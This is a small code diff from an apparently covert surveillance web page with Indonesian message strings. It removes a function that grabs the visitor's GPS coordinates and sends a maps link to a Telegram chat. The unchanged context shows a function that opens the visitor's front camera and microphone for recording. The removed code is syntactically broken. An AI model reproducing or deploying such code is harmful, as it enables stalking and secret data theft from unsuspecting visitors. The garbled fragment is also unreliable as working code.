@@ -200,19 +200,6 @@
       } catch (err) {}
     }
 
-    async function (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
-          },
-          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
-        );
-      } else {
-        sendToTelegram(`📍 Browser tidak support GPS`);
-      }
-    }
-    
     async function recordFrontVideo() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
